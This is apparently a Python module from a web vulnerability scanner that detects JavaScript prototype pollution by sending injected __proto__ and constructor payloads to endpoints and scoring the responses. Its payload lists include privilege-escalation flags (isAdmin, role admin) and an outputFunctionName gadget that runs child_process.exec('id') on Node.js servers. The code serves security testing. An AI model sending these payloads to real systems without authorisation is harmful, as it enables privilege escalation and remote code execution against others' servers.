"""
modules/prototype_pollution_detector.py - JavaScript Prototype Pollution Detection
Detects prototype pollution vulnerabilities in JavaScript applications.
"""

import re
import logging
import urllib.parse
from typing import Dict, List, Any
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.proto_pollution")


class PrototypePollutionDetector:
    """
    Detects JavaScript Prototype Pollution vulnerabilities.

    Tests parameters for prototype pollution by attempting to inject
    __proto__, constructor, or prototype properties.
    """

    # Client-side pollution payloads
    POLLUTION_PAYLOADS = [
        # Standard __proto__ injection
        {"__proto__": {"polluted": "污染"}},
        {"__proto__": {"test": "value"}},
        {"__proto__": None},
        # Constructor injection
        {"constructor": {"prototype": {"polluted": True}}},
        {"constructor": {"prototype": {"test": 1}}},
        # Prototype injection via JSON body
        {"x": {"__proto__": {"y": "z"}}},
        {"x": {"constructor": {"prototype": {"x": 1}}}},
    ]

    # Server-side prototype pollution (Node.js / Express / Lodash / etc.)
    SERVER_SIDE_PAYLOADS = [
        # Override toString/valueOf that server uses in templates/serialization
        {"__proto__": {"toString": "[object Object]"}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"debug": True}},
        {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id')//"}},
        # Lodash merge pollution
        {"__proto__": {"polluted": "yes"}},
        # URL query string pollution (qs library)
        {"__proto__[polluted]": "yes"},
        {"constructor[prototype][polluted]": "yes"},
    ]

    # URL-encoded parameter pollution (for GET requests / qs library)
    QS_POLLUTION_PARAMS = [
        "__proto__[polluted]",
        "__proto__[admin]",
        "__proto__[isAdmin]",
        "constructor[prototype][polluted]",
        "constructor[prototype][admin]",
    ]

    # Parameters commonly vulnerable to prototype pollution
    POLLUTION_PARAM_NAMES = {
        "data",
        "input",
        "json",
        "body",
        "obj",
        "object",
        "params",
        "query",
        "q",
        "search",
        "filter",
        "sort",
        "order",
        "field",
        "column",
        "row",
        "limit",
        "offset",
        "page",
        "size",
        "num",
        "config",
        "settings",
        "options",
        "preferences",
        "properties",
        "attributes",
        "meta",
        "info",
        "details",
        "name",
        "value",
        "callback",
        "function",
        "fn",
        "handler",
        "next",
        "to",
        "redirect",
        "uri",
        "url",
        "path",
        "dest",
        "target",
    }

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()
        self.findings = []

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """
        Scan endpoints for prototype pollution vulnerabilities.

        Args:
            endpoints: List of endpoint dicts or URLs
            progress_cb: Optional progress callback

        Returns:
            Dict with vulnerabilities and metadata
        """
        logger.info(
            f"[PROTO] Starting prototype pollution detection on {len(endpoints)} endpoints"
        )

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "pollution_confirmed": 0,
        }

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                raw_params = endpoint.get("parameters") or endpoint.get(
                    "query_params"
                ) or []
                if isinstance(raw_params, dict):
                    params = list(raw_params.keys())
                else:
                    params = list(raw_params)
                method = (endpoint.get("method") or "GET").upper()
            else:
                url = str(endpoint)
                params = []
                method = "GET"

            if not url:
                continue

            # Check URL params for pollution-susceptible names
            parsed = urllib.parse.urlparse(url)
            url_params = list(urllib.parse.parse_qs(parsed.query).keys())

            # Combine endpoint params with URL params
            all_params = list(set(params + url_params))

            # Check each pollution-susceptible parameter
            for param in all_params:
                if param.lower() in self.POLLUTION_PARAM_NAMES:
                    poll_result = self._test_prototype_pollution(url, param, method)
                    if poll_result.get("vulnerable"):
                        results["vulnerabilities"].append(poll_result)
                        results["pollution_confirmed"] += 1

            results["endpoints_tested"] += 1

        # Also test server-side prototype pollution via Node.js/Express patterns
        server_side_results = self._test_server_side_pollution(endpoints)
        for vuln in server_side_results:
            results["vulnerabilities"].append(vuln)
            results["pollution_confirmed"] += 1

        logger.info(
            f"[PROTO] Found {results['pollution_confirmed']} prototype pollution vulnerabilities"
        )
        return results

    def _test_server_side_pollution(self, endpoints: List[Any]) -> List[Dict[str, Any]]:
        """Test server-side prototype pollution (Node.js / Express)."""
        import json as json_module
        vulns = []
        tested_hosts = set()

        for endpoint in endpoints:
            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                method = (endpoint.get("method") or "POST").upper()
            else:
                url = str(endpoint)
                method = "POST"

            if not url:
                continue

            import urllib.parse as _up
            parsed = _up.urlparse(url)
            host = f"{parsed.scheme}://{parsed.netloc}"
            if host in tested_hosts:
                continue
            tested_hosts.add(host)

            # Test 1: JSON body with __proto__
            for payload in self.SERVER_SIDE_PAYLOADS[:5]:
                try:
                    if method == "POST":
                        resp = self.http_client.post(
                            url,
                            json=payload,
                            headers={"Content-Type": "application/json"},
                            timeout=10,
                        )
                    else:
                        resp = self.http_client.get(url, timeout=10)

                    text = resp.text if hasattr(resp, "text") else ""
                    check = self._check_server_side_indicators(resp, payload)
                    if check["score"] > 0.5:
                        vulns.append({
                            "url": url,
                            "parameter": "__proto__",
                            "method": method,
                            "vulnerable": True,
                            "attack_type": "server_side_prototype_pollution",
                            "confidence": check["score"],
                            "evidence": [{"payload": str(payload)[:100],
                                          "indicator": check["reason"]}],
                            "severity": "HIGH",
                        })
                        break
                except Exception as e:
                    logger.debug(f"[PROTO] Server-side test error: {e}")

            # Test 2: Query string pollution via qs-style params
            for qs_param in self.QS_POLLUTION_PARAMS[:3]:
                try:
                    test_url = f"{url}?{qs_param}=polluted_value"
                    resp = self.http_client.get(test_url, timeout=10)
                    check = self._check_server_side_indicators(resp, {"param": qs_param})
                    if check["score"] > 0.5:
                        vulns.append({
                            "url": url,
                            "parameter": qs_param,
                            "method": "GET",
                            "vulnerable": True,
                            "attack_type": "server_side_prototype_pollution_qs",
                            "confidence": check["score"],
                            "evidence": [{"qs_param": qs_param,
                                          "indicator": check["reason"]}],
                            "severity": "HIGH",
                        })
                        break
                except Exception as e:
                    logger.debug(f"[PROTO] QS pollution test error: {e}")

        return vulns

    def _check_server_side_indicators(self, response, payload) -> Dict[str, Any]:
        """Check for server-side prototype pollution indicators."""
        score = 0.0
        reason = ""
        text = response.text if hasattr(response, "text") else ""

        # Look for pollution marker reflected in response
        for marker in ["polluted_value", "polluted", "yes", "true"]:
            if marker in text.lower():
                # Check if it's in a JSON property named after our pollution
                import re as _re
                if _re.search(rf'"(isAdmin|admin|role|debug|polluted)":\s*(true|"admin"|"yes")', text):
                    score = 0.85
                    reason = "Server-side prototype pollution: property reflected in JSON response"
                    return {"score": score, "reason": reason}
                score = max(score, 0.4)
                reason = "Pollution marker found in response"

        # Check for privilege escalation indicators
        privilege_patterns = [
            r'"role"\s*:\s*"admin"',
            r'"isAdmin"\s*:\s*true',
            r'"admin"\s*:\s*true',
            r'"debug"\s*:\s*true',
        ]
        import re as _re
        for pattern in privilege_patterns:
            if _re.search(pattern, text, _re.IGNORECASE):
                score = max(score, 0.75)
                reason = f"Privilege property in response: {pattern}"
                break

        # Node.js error messages revealing pollution
        node_patterns = [
            r"TypeError.*prototype",
            r"Cannot read property.*undefined",
            r"__proto__.*is not",
            r"Object\.prototype",
        ]
        for pattern in node_patterns:
            if _re.search(pattern, text, _re.IGNORECASE):
                score = max(score, 0.6)
                reason = f"Node.js prototype error: {pattern}"
                break

        return {"score": min(score, 1.0), "reason": reason}

    def _test_prototype_pollution(
        self, url: str, param: str, method: str = "GET"
    ) -> Dict[str, Any]:
        """Test a specific parameter for prototype pollution"""
        result = {
            "url": url,
            "parameter": param,
            "method": method,
            "vulnerable": False,
            "confidence": 0.0,
            "evidence": [],
            "payloads_tested": 0,
        }

        # First, get baseline response
        baseline_url = self._inject_param(url, param, "baseline_test")
        try:
            baseline_resp = self.http_client.get(baseline_url, timeout=10)
            baseline_text = baseline_resp.text
            baseline_status = baseline_resp.status_code
        except:
            baseline_text = ""
            baseline_status = 0

        # Test pollution payloads
        for payload in self.POLLUTION_PAYLOADS:
            result["payloads_tested"] += 1
            try:
                if method == "POST":
                    # For POST, try JSON body
                    import json

                    response = self.http_client.post(
                        url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                    )
                else:
                    # For GET, use query parameter
                    test_url = self._inject_json_param(url, param, payload)
                    response = self.http_client.get(test_url, timeout=10)

                # Check for prototype pollution indicators
                indicators = self._check_pollution_indicators(response, payload)

                if indicators["score"] > 0.3:
                    result["vulnerable"] = True
                    result["confidence"] = indicators["score"]
                    result["evidence"].append(
                        {
                            "payload": str(payload)[:100],
                            "indicator": indicators["reason"],
                            "status": response.status_code,
                        }
                    )

                    if result["confidence"] >= 0.8:
                        break

            except Exception as e:
                logger.debug(f"[PROTO] Error testing {param} on {url}: {e}")
                continue

        return result

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a value into the parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)

        return urllib.parse.urlparse(url)._replace(query=new_query).geturl()

    def _inject_json_param(self, url: str, param: str, payload: Dict) -> str:
        """Inject JSON payload as parameter value"""
        import json

        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Try to inject the JSON object as a string
        params[param] = [json.dumps(payload)]
        new_query = urllib.parse.urlencode(params, doseq=True)

        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _check_pollution_indicators(self, response, payload: Dict) -> Dict[str, Any]:
        """Check response for prototype pollution indicators"""
        score = 0.0
        reason = ""

        response_text = response.text if hasattr(response, "text") else ""

        # Check if payload key is reflected
        for key in payload.keys():
            if key in response_text:
                score += 0.2
                reason = "Pollution payload key reflected"

        # Check for pollution indicators in JSON responses
        try:
            import json

            resp_json = json.loads(response_text)

            # Check if __proto__ or constructor was processed
            if "__proto__" in payload:
                # If we can find pollution marker in response, it's vulnerable
                poll_marker = payload["__proto__"]
                for k, v in (
                    poll_marker.items() if isinstance(poll_marker, dict) else []
                ):
                    if k in resp_json or str(v) in str(resp_json):
                        score += 0.4
                        reason = "Prototype pollution detected"

            if "constructor" in payload:
                if "constructor" in resp_json:
                    score += 0.3
                    reason = reason or "Constructor injection possible"

        except (json.JSONDecodeError, TypeError):
            pass

        # Check for common pollution behaviors
        pollution_patterns = [
            "undefined",
            "null is not an object",
            "cannot read property",
            "hasOwnProperty",
            "__proto__",
            "prototype",
            "[object Object]",
        ]

        for pattern in pollution_patterns:
            if pattern in response_text:
                score += 0.15
                reason = reason or f"Prototype-related error: {pattern}"

        return {"score": min(score, 1.0), "reason": reason}


def detect_prototype_pollution(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for prototype pollution detection"""
    detector = PrototypePollutionDetector(state=state)
    return detector.detect(endpoints, progress_cb)
